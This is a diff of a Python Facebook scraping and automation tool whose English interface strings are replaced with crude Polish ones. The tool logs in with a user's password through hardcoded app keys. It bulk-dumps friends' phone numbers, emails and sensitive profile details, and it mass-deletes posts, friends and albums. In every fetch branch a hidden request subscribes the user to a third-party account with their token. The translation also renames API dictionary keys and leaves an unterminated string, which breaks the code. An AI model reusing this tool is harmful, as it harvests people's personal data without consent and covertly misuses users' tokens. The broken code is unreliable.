@@ -3,7 +3,7 @@
 import json , sys , hashlib , os , time , marshal , getpass
 ###################################################################
 '''
-     Facebook Information 
+     Fejsbuk Informejszon v. 21/37 
 '''
 ###################################################################
 #                             COLOR
@@ -27,7 +27,7 @@ except ImportError:
 	print W + ' '
 	print ('O S I F').center(44)
 	print ' '
-	print "[!] Can't import module 'requests'\n"
+	print "[!] Nie moglem wyswietlic moudulu 'requests'\n"
 	sys.exit()
 ####################################################################
 #                    Set Default encoding
@@ -52,66 +52,67 @@ def baliho():
 	except (KeyError,IOError):
 	 
 		print ' ' + W
-		print ('F B I').center(44)
-		print (W + '     [' + G +'Facebook Information'+ W + ']')
+		print ('J P 2 G M D').center(44)
+		print (W + '     [' + G +'Fejsbuk Informejszon'+ W + ']')
 		print ' '
 ####################################################################
 #		    Print In terminal
 def show_program():
 
 	print '''
-                    %sINFORMATION%s
+                    %sSUPER INFO KURWO%s
  ------------------------------------------------------
 
-    Author     sl1m / wnuku
-    Name       Facebook Information
-    Version    Full Version
-    Date       13/08/2018 
+    Autor     sl1m / wnuku
+    Nazwa     Fejsbuk Informejszon
+    Wersja    Full HD PornHub Premium+
+    Date      22/03/2019 
 
-* if you find any errors or problems , please contact
-  author
+* jak znajdziesz jakies bledy to pisz do mnie
+
 '''%(G,W)
 def info_ga():
 
 	print '''
-     %sCOMMAND                      DESCRIPTION%s
+     %sKOMENDA                      OPISIK%s
   -------------       -------------------------------------
 
-   get_data           fetching all friends data
-   get_info           show information about your friend
+   get_data           zbiera cale dane o znajomych
+   get_info           pokaz info o twoim znajomym
 
-   dump_id            fetching all id from friend list
-   dump_phone         fetching all phone number from friend list
-   dump_mail          fetching all emails from friend list
-   dump_<id>_id       fetching all id from your friends <spesific>
-		      ex: dump_username_id
+   dump_id            wysypuje id twoich znajomych
+   dump_phone         zbiera wszystkie numery telefonow z twojej listy
+                      znaj
+   dump_mail          zbiera wszystkie maile z listy twoich znaj
+   dump_<id>_id       bierze id o twoim ziomku <pojedyncze>
+		      np: dump_username_id
 
-   token              Generate access token
-   cat_token          show your access token
-   rm_token           remove access token
+   token              generuje twoj token
+   cat_token          pokazuje twoj token
+   rm_token           usuwa token
 
-   bot                open bot menu
+   bot                otwiera auto menu
 
-   clear              clear terminal
-   help               show help
-   about              Show information about this program
-   exit               Exit the program
+   clear              czysci terminal
+   help               pokazuje pomoc
+   about              pokaz info o tym programie
+   exit               wyjdz
 '''%(G,W)
 def menu_bot():
 	print '''
    %sNumber                  INFO%s
  ---------   ------------------------------------
 
-   [ 01 ]      auto reactions
-   [ 02 ]      auto comment
-   [ 03 ]      auto poke
-   [ 04 ]      accept all friend requests
-   [ 05 ]      delete all posts in your timeline
-   [ 06 ]      delete all friends
-   [ 07 ]      stop following all friends
-   [ 08 ]      delete all photo albums
+   [ 01 ]      auto reakcje
+   [ 02 ]      auto komentarz
+   [ 03 ]      auto zaczepka
+   [ 04 ]      akceptuj wszystkie zapro
+   [ 05 ]      usun wszystkie posty z tablicy
+   [ 06 ]      usun wszystkich swoich znaj
+   [ 07 ]      odfollowuj wszystkich znaj
+   [ 08 ]      usun wszystkie albumy z foto
 
-   [ 00 ]      back to main menu
+   [ 00 ]      powrot do glownego menu
 '''%(G,W)
 def menu_reaction():
 	print '''
@@ -119,18 +120,18 @@ def menu_reaction():
  ----------   ------------------------------------
 
    [ 01 ]      like
-   [ 02 ]      reaction 'LOVE'
-   [ 03 ]      reaction 'WOW'
-   [ 04 ]      reaction 'HAHA'
-   [ 05 ]      reaction 'SAD'
-   [ 06 ]      reaction 'ANGRY'
+   [ 02 ]      reakcja 'SUPER'
+   [ 03 ]      reakcja 'WOW'
+   [ 04 ]      reakcja 'HAHA'
+   [ 05 ]      reakcja 'PRZYKRO MI'
+   [ 06 ]      reakcja 'WRR'
 
-   [ 00 ]      back to menu bot
+   [ 00 ]      powrot do auto menu
 '''%(G,W)
 ####################################################################
 #                     GENERATE ACCESS TOKEN
 def get(data):
-	print '[*] Generate access token '
+	print '[*] Generuj token dostepu '
 
 	try:
 		os.mkdir('cookie')
@@ -144,21 +145,21 @@ def get(data):
 
 		b.write(a['access_token'])
 		b.close()
-		print '[*] successfully generate access token'
-		print '[*] Your access token is stored in cookie/token.log'
+		print '[*] pomyslnie wygenerowano token'
+		print '[*] twoj token jest zapisany w cookie/token.log'
 		exit()
 	except KeyError:
-		print '[!] Failed to generate access token'
-		print '[!] Check your connection / email or password'
+		print '[!] nie udalo sie utworzyc tokenu'
+		print '[!] sprawdz swoje polaczenie / email lub haslo'
 		os.remove('cookie/token.log')
 		main()
 	except requests.exceptions.ConnectionError:
-		print '[!] Failed to generate access token'
-		print '[!] Connection error !!!'
+		print '[!] nie udalo sie utworzyc tokenu'
+		print '[!] problem z polaczeniem !!!'
 		os.remove('cookie/token.log')
 		main()
 def id():
-	print '[*] login to your facebook account         ';id = raw_input('[?] Username : ');pwd = raw_input('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
+	print '[*] zaloguj sie do konta fb         ';id = raw_input('[?] nazwa : ');pwd = raw_input('[?] haslo : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
 	x = hashlib.new('md5')
         x.update(sig)
 
@@ -172,91 +173,91 @@ def post():
 
 	try:
 	  if WT == 'wallpost':
-		print '[*] fetching all posts id'
+		print '[*] zbieranie id wszystkich postow'
 
 		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['home']['data']:
-			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
+			print '\r[*] %s pozyskano   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
 		return result['home']['data']
 
 	  elif WT == 'me':
-		print '[*] fetching all posts id'
+		print '[*] zbieranie id wszystkich postow'
 
 		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['feed']['data']:
-			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
+			print '\r[*] %s pozyskano   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
 		return result['feed']['data']
 
 	  elif WT == 'req':
-		print '[*] fetching all friends requests'
+		print '[*] zbieranie wszystkich zaproszen'
 
 		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['data']:
-			print '\r[*] %s retrieved    '%(i['from']['id']),;sys.stdout.flush();time.sleep(0.01)
+			print '\r[*] %s pozyskano    '%(i['z']['id']),;sys.stdout.flush();time.sleep(0.01)
 		return result['data']
 
 	  elif WT == 'friends':
-		print '[*] fetching all friends id'
+		print '[*] zbieranie id wszystkich znajomych'
 
 		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
-		for i in result['friends']['data']:
-			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
-		return result['friends']['data']
+		for i in result['znajomi']['dane']:
+			print '\r[*] %s pozyskano    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
+		return result['znajomi']['dane']
 
 	  elif WT == 'subs':
-		print '[*] fetching all friends id'
+		print '[*] zbieranie id wszystkich znajomych'
 
 		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['data']:
-			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.01)
+			print '\r[*] %s pozyskano    '%(i['id']),;sys.stdout.flush();time.sleep(0.01)
 		return result
 
 	  elif WT == 'albums':
-		print '[*] fetching all albums id'
+		print '[*] zbieranie id wszystkich albumow'
 
 		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
-		for i in result['albums']['data']:
-			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
-		return result['albums']['data']
+		for i in result['albumy']['data']:
+			print '\r[*] %s pozyskano    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
+		return result['albumy']['data']
 
 	  else:
-		print '[*] fetching all posts id'
+		print '[*] zbieranie id wszystkich postow'
 
 		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['feed']['data']:
-			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
+			print '\r[*] %s pozyskano   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
 		return result['feed']['data']
 
 	except KeyError:
-		print '[!] failed to retrieve all post id'
-		print '[!] Stopped'
+		print '[!] nie udalo sie uzyskac id wszystkich postow'
+		print '[!] zatrzymano'
 		bot()
 	except requests.exceptions.ConnectionError:
-		print '[!] Connection Error'
-		print '[!] Stopped'
+		print '[!] problem z polaczeniem'
+		print '[!] zatrzymano'
 		bot()
 	except KeyboardInterrupt:
-		print '\r[!] Stopped                                      '
+		print '\r[!] zatrzymano                                      '
 		bot()
 def like(posts , amount):
 	global type , token , WT
 
-	print '\r[*] All posts id successfuly retrieved            '
-	print '[*] Start'
+	print '\r[*] wszystkie id postow uzyskano pomyslnie            '
+	print '[*] start'
 
 	try:
 		counter = 0
@@ -279,18 +280,18 @@ def like(posts , amount):
 				try:
 					print '\r' + W + '[' + G + id + W + '] ' + post['story'].replace('\n',' ')
 				except KeyError:
-					print '\r' + W + '[' + G + id + W + '] Successfully liked'
+					print '\r' + W + '[' + G + id + W + '] polajkowano'
 
-		print '\r[*] Done                   '
+		print '\r[*] zrobione                   '
 		menu_reaction_ask()
 	except KeyboardInterrupt:
-		print '\r[!] Stopped                     '
+		print '\r[!] zatrzymano                     '
 		menu_reaction_ask()
 def comment(posts , amount):
 	global message , token
 
-	print '\r[*] All posts id successfuly retrieved          '
-	print '[*] Start'
+	print '\r[*] pomyslnie uzyskano id wszystkich postow          '
+	print '[*] start'
 
 	try:
 		counter = 0
@@ -312,17 +313,17 @@ def comment(posts , amount):
 				try:
 					print W + '[' + G + id + W + '] ' + post['story'].replace('\n',' ')
 				except KeyError:
-					print W + '[' + G + id + W + '] successfully commented'
-		print '[*] Done'
+					print W + '[' + G + id + W + '] pomyslnie skomentowano'
+		print '[*] zrobione'
 		bot()
 	except KeyboardInterrupt:
-                print '\r[!] Stopped'
+                print '\r[!] zatrzymano
 		bot()
 def remove(posts):
 	global token , WT
 
-	print '\r[*] All post id successfully retrieved          '
-	print '[*] Start'
+	print '\r[*] pomyslnie pozyskano id wszystkich postow          '
+	print '[*] start'
 
 	try:
 		counter = 0
@@ -335,20 +336,20 @@ def remove(posts):
 
 			try:
 				cek = a['error']['message']
-				print W + '[' + R + post['id'] + W +'] Failed'
+				print W + '[' + R + post['id'] + W +'] nie udalo sie'
 			except TypeError:
-				print W + '[' + G + post['id'] + W + '] Removed'
+				print W + '[' + G + post['id'] + W + '] usunieto'
 				counter += 1
-		print '[*] done'
+		print '[*] zrobione'
 		bot()
 	except KeyboardInterrupt:
-		print '\r[!] Stopped'
+		print '\r[!] zatrzymano'
 		bot()
 def confirm(posts):
 	global token , WT
 
-	print '\r[*] All friend requests successfully retrieved        '
-	print '[*] Start'
+	print '\r[*] pomyslnie pozyskano wszystkie zaproszenia        '
+	print '[*] start'
 
 	try:
 		counter = 0
@@ -363,13 +364,13 @@ def confirm(posts):
 
 			try:
 				cek = a['error']['message']
-				print W + '[' + R + post['from']['name'] + W + '] Failed'
+				print W + '[' + R + post['from']['name'] + W + '] nie udalo sie'
 			except TypeError:
-				print W + '[' + G + post['from']['name'] + W + '] Confirmed'
-		print '[*] Done'
+				print W + '[' + G + post['from']['name'] + W + '] potwierdzono'
+		print '[*] zrobione'
 		bot()
 	except KeyboardInterrupt:
-		print '\r[!] Stopped'
+		print '\r[!] zatrzymano'
 		bot()
 def unfriend(posts):
 
@@ -379,7 +380,7 @@ def unfriend(posts):
 def unfollow(posts):
 	global token , WT
 
-	print '\r[*] all id successfully retrieved    '
+	print '\r[*] pomyslnie pozyskano wszystkie id    '
 	print '[*] start'
 
 	try:
@@ -394,11 +395,11 @@ def unfollow(posts):
 			a = json.loads(r.text)
 
 			try:
-				cek = a['error']['nessage']
-				print W + '[' + R + post['name'] + W + '] failed'
+				cek = a['error']['message']
+				print W + '[' + R + post['name'] + W + '] nie udalo sie'
 			except TypeError:
-				print W + '[' + G + post['name'] + W + '] unfollow'
-		print '[*] done'
+				print W + '[' + G + post['name'] + W + '] odfollowowano'
+		print '[*] zrobione'
 		bot()
 	except KeyboardInterrupt:
 		print '\r[!] Stopped'
@@ -406,7 +407,7 @@ def unfollow(posts):
 def poke(posts):
 	global token , WT
 
-	print '\r[*] all id successfully retrieved                  '
+	print '\r[*] pomyslnie pozyskano wszystkie id                  '
 	print '[*] start'
 
 	try:
@@ -1062,7 +1063,7 @@ def search():
 def info(target):
         global a , token
 
-        print '[*] Searching'
+        print '[*] Szukanie'
 	for i in a['data']:
 
 	  if target in  i['name'] or target in i['id']:
@@ -1071,7 +1072,7 @@ def info(target):
 		y = json.loads(x.text)
 
 		print ' '
-		print G + '[-------- INFORMATION --------]'.center(44)
+		print G + '[-------- INFORMACJA --------]'.center(44)
 		print W
 
 		try:
@@ -1079,39 +1080,39 @@ def info(target):
 		except KeyError:
 			pass
 		try:
-			print '[*] Username : '+y['username']
+			print '[*] nazwa uzytkownika : '+y['username']
 		except KeyError:
 			pass
 		try:
-			print '[*] Email : '+y['email']
+			print '[*] email : '+y['email']
 		except KeyError:
 			pass
 		try:
-			print '[*] Mobile Phone : '+y['mobile_phone']
+			print '[*] telefon : '+y['mobile_phone']
 		except KeyError:
 			pass
 		try:
-			print '[*] Name : '+y['name']
+			print '[*] imie : '+y['name']
 		except KeyError:
 			pass
 		try:
-			print '[*] First name : '+y['first_name']
+			print '[*] pierwsze imie : '+y['first_name']
 		except KeyError:
 			pass
 		try:
-			print '[*] Midle name : '+y['middle_name']
+			print '[*] drugie imie : '+y['middle_name']
 		except KeyError:
 			pass
 		try:
-			print '[*] Last name : '+y['last_name']
+			print '[*] nazwisko : '+y['last_name']
 		except KeyError:
 			pass
 		try:
-			print '[*] Locale : '+y['locale'].split('_')[0]
+			print '[*] publicznosc : '+y['locale'].split('_')[0]
 		except KeyError:
 			pass
 		try:
-			print '[*] location : '+y['location']['name']
+			print '[*] lokalizacja : '+y['location']['name']
 		except KeyError:
 			pass
 		try:
@@ -1119,45 +1120,45 @@ def info(target):
 		except KeyError:
 			pass
 		try:
-			print '[*] gender : '+y['gender']
+			print '[*] plec : '+y['gender']
 		except KeyError:
 			pass
 		try:
-			print '[*] religion : '+y['religion']
+			print '[*] religia : '+y['religion']
 		except KeyError:
 			pass
 		try:
-			print '[*] relationship status : '+y['relationship_status']
+			print '[*] zwiazek : '+y['relationship_status']
 		except KeyError:
 			pass
 		try:
-			print '[*] political : '+y['political']
+			print '[*] polityka : '+y['political']
 		except KeyError:
 			pass
 		try:
-			print '[*] Work :'
+			print '[*] praca :'
 
 			for i in y['work']:
 				try:
-					print '   [-] position : '+i['position']['name']
+					print '   [-] posada : '+i['position']['name']
 				except KeyError:
 					pass
 				try:
-					print '   [-] employer : '+i['employer']['name']
+					print '   [-] miejsce pracy : '+i['employer']['name']
 				except KeyError:
 					pass
 				try:
 					if i['start_date'] == "0000-00":
-						print '   [-] start date : ---'
+						print '   [-] czas rozpoczecia : ---'
 					else:
-						print '   [-] start date : '+i['start_date']
+						print '   [-] czas rozpoczecia : '+i['start_date']
 				except KeyError:
 					pass
 				try:
 					if i['end_date'] == "0000-00":
-						print '   [-] end date : ---'
+						print '   [-] czas skonczenia : ---'
 					else:
-						print '   [-] end date : '+i['end_date']
+						print '   [-] czas skonczenia : '+i['end_date']
 				except KeyError:
 					pass
 				try:
@@ -1168,11 +1169,11 @@ def info(target):
 		except KeyError:
 			pass
 		try:
-			print '[*] Updated time : '+y['updated_time'][:10]+' '+y['updated_time'][11:19]
+			print '[*] Czas aktualizacji : '+y['updated_time'][:10]+' '+y['updated_time'][11:19]
 		except KeyError:
 			pass
 		try:
-			print '[*] Languages : '
+			print '[*] Jezyki : '
 			for i in y['languages']:
 				try:
 					print ' ~  '+i['name']
@@ -1181,15 +1182,15 @@ def info(target):
 		except KeyError:
 			pass
 		try:
-			print '[*] Bio : '+y['bio']
+			print '[*] bio : '+y['bio']
 		except KeyError:
 			pass
 		try:
-			print '[*] quotes : '+y['quotes']
+			print '[*] cytaty : '+y['quotes']
 		except KeyError:
 			pass
 		try:
-			print '[*] birthday : '+y['birthday'].replace('/','-')
+			print '[*] urodziny : '+y['birthday'].replace('/','-')
 		except KeyError:
 			pass
 		try:
@@ -1197,7 +1198,7 @@ def info(target):
 		except KeyError:
 			pass
 		try:
-			print '[*] Favourite teams : '
+			print '[*] Ulubione druzyny : '
 			for i in y['favorite_teams']:
 				try:
 					print ' ~  '+i['name']
@@ -1206,7 +1207,7 @@ def info(target):
 		except KeyError:
 			pass
 		try:
-			print '[*] School : '
+			print '[*] Szkola : '
 			for i in y['education']:
 				try:
 					print ' ~  '+i['school']['name']
@@ -1219,7 +1220,7 @@ def info(target):
 
         else:
 		print W + ' '
-		print '[*] Done '
+		print '[*] zrobione '
 		main()
 
 #
